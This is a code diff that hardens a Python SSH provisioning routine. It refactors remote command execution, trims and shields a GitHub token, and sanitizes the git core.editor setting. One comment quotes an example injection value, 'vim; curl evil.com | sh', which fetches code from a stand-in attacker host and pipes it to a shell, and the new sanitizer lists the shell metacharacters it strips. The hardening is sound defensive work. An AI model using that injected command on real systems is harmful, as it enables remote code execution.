@@ -1826,14 +1826,17 @@ def _setup_github_integration(
             f"sudo -n -H -u {quoted_agent} tee {quoted_gitconfig} > /dev/null "
             f"&& sudo -n -H -u {quoted_agent} chmod 0600 {quoted_gitconfig}"
         )
-        stdin, stdout, stderr = client.exec_command(write_cmd, timeout=timeout)
-        stdin.write(gitconfig_body)
-        stdin.channel.shutdown_write()
-        _ = stdout.read()
-        err_bytes = stderr.read()
-        rc = stdout.channel.recv_exit_status()
+        rc, _out, err_text = _run_ssh_with_stdin(
+            client,
+            write_cmd,
+            stdin_body=gitconfig_body,
+            timeout=timeout,
+            context=(
+                f"gitconfig write for {agent_name!r} "
+                f"(integration {integ.name!r})"
+            ),
+        )
         if rc != 0:
-            err_text = err_bytes.decode("utf-8", errors="replace").strip()
             raise CanonicalSyncError(
                 f"gitconfig write failed for {agent_name!r} "
                 f"(integration {integ.name!r}): {err_text}"
@@ -1847,7 +1850,12 @@ def _setup_github_integration(
     # Step 2: per github integration, gh auth login + setup-git.
     for integ in github_ints:
         creds = dict(integ.credentials)
-        token = creds.get("GITHUB_TOKEN", "")
+        # `.strip()` collapses whitespace-only tokens ("   ") that
+        # would otherwise pass the truthy check, get piped to
+        # `gh auth login`, and surface as a confusing gh-side error
+        # instead of a clean CanonicalSyncError. Same tampered-secrets
+        # defense as the gitconfig CR/LF/NUL sanitizer.
+        token = creds.get("GITHUB_TOKEN", "").strip()
         if not token:
             raise CanonicalSyncError(
                 f"github integration {integ.name!r} attached to "
@@ -1858,16 +1866,21 @@ def _setup_github_integration(
         # stdin. Runs as the agent user so `~/.config/gh/hosts.yml`
         # lands in the right home. Idempotent: subsequent runs
         # overwrite the same hosts.yml with the same content when the
-        # token is unchanged.
+        # token is unchanged. Token stays in stdin — never in argv,
+        # never in a log line, never in an exception message (`context`
+        # names only the integration).
         login_cmd = f"sudo -n -H -u {quoted_agent} gh auth login --with-token"
-        stdin, stdout, stderr = client.exec_command(login_cmd, timeout=timeout)
-        stdin.write(token + "\n")
-        stdin.channel.shutdown_write()
-        _ = stdout.read()
-        err_bytes = stderr.read()
-        rc = stdout.channel.recv_exit_status()
+        rc, _out, err_text = _run_ssh_with_stdin(
+            client,
+            login_cmd,
+            stdin_body=token + "\n",
+            timeout=timeout,
+            context=(
+                f"gh auth login for {agent_name!r} "
+                f"(integration {integ.name!r})"
+            ),
+        )
         if rc != 0:
-            err_text = err_bytes.decode("utf-8", errors="replace").strip()
             raise CanonicalSyncError(
                 f"gh auth login failed for {agent_name!r} "
                 f"(integration {integ.name!r}): {err_text}"
@@ -1878,12 +1891,17 @@ def _setup_github_integration(
         # any) — reversing the order silently drops the credential
         # helper line the next time gitconfig is re-rendered.
         setup_cmd = f"sudo -n -H -u {quoted_agent} gh auth setup-git"
-        _, s_out, s_err = client.exec_command(setup_cmd, timeout=timeout)
-        _ = s_out.read()
-        err_bytes = s_err.read()
-        rc = s_out.channel.recv_exit_status()
+        rc, _out, err_text = _run_ssh_with_stdin(
+            client,
+            setup_cmd,
+            stdin_body=None,
+            timeout=timeout,
+            context=(
+                f"gh auth setup-git for {agent_name!r} "
+                f"(integration {integ.name!r})"
+            ),
+        )
         if rc != 0:
-            err_text = err_bytes.decode("utf-8", errors="replace").strip()
             raise CanonicalSyncError(
                 f"gh auth setup-git failed for {agent_name!r} "
                 f"(integration {integ.name!r}): {err_text}"
@@ -1894,6 +1912,47 @@ def _setup_github_integration(
                 f"wired gh + git credential helper for github "
                 f"integration {integ.name!r} on {agent_name}",
             )
+
+
+def _run_ssh_with_stdin(
+    client: paramiko.SSHClient,
+    cmd: str,
+    *,
+    stdin_body: str | None,
+    timeout: int,
+    context: str,
+) -> tuple[int, bytes, str]:
+    """Run `cmd` on `client`, optionally pipe `stdin_body`, drain both
+    pipes BEFORE `recv_exit_status`, and normalize transport errors.
+
+    Returns `(rc, stdout_bytes, stderr_text)`. `stderr_text` is
+    UTF-8-decoded-lossy and `.strip()`-ed for direct inclusion in
+    error messages.
+
+    Wraps `paramiko.SSHException` and `OSError` (which covers
+    `socket.timeout`, connection resets, and channel-write EOF) in
+    `CanonicalSyncError` so the hook's failure surface is uniform with
+    its own exit-code branches — no raw paramiko exception leaks out
+    of `_setup_github_integration`.
+    """
+    try:
+        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
+        if stdin_body is not None:
+            stdin.write(stdin_body)
+            stdin.channel.shutdown_write()
+        # Drain BEFORE recv_exit_status: `gh` prints login banners /
+        # setup-git advice up to ~2KB; on a chatty combined stream the
+        # ~64KB SSH pipe buffer can fill and block the remote's write,
+        # so recv_exit_status hangs forever. Same rationale documented
+        # in `_openclaw_install_plugins`.
+        out_bytes = stdout.read()
+        err_bytes = stderr.read()
+        rc = stdout.channel.recv_exit_status()
+    except (paramiko.SSHException, OSError) as exc:
+        raise CanonicalSyncError(
+            f"SSH transport error during {context}: {exc}"
+        ) from exc
+    return rc, out_bytes, err_bytes.decode("utf-8", errors="replace").strip()
 
 
 def _render_gitconfig_body(creds: dict) -> str:
@@ -1908,11 +1967,24 @@ def _render_gitconfig_body(creds: dict) -> str:
     def _sanitize(v: str) -> str:
         return v.replace("\n", " ").replace("\r", "").replace("\x00", "")
 
+    def _sanitize_shell(v: str) -> str:
+        # `core.editor` is invoked by git via `sh -c "<editor> <file>"`,
+        # so a value like `vim; curl evil.com | sh` would execute the
+        # tail as the agent user the next time any git operation opens
+        # an editor. Strip shell metacharacters in addition to the
+        # newline/null sanitize. Allowlist would be too restrictive
+        # (operators legitimately use `code --wait`, `nvim -c ...`,
+        # `emacs -nw`) but any metacharacter is disqualifying.
+        cleaned = _sanitize(v)
+        for meta in (";", "|", "&", "`", "$", "(", ")", "<", ">", "\\"):
+            cleaned = cleaned.replace(meta, "")
+        return cleaned
+
     user_name = _sanitize(str(creds.get("GIT_USER_NAME", "") or ""))
     user_email = _sanitize(str(creds.get("GIT_USER_EMAIL", "") or ""))
     default_branch = _sanitize(str(creds.get("GIT_INIT_DEFAULT_BRANCH", "") or "main"))
     pull_rebase = _sanitize(str(creds.get("GIT_PULL_REBASE", "") or "false"))
-    core_editor = _sanitize(str(creds.get("GIT_CORE_EDITOR", "") or "vim"))
+    core_editor = _sanitize_shell(str(creds.get("GIT_CORE_EDITOR", "") or "vim"))
     return (
         "[user]\n"
         f"    name = {user_name}\n"
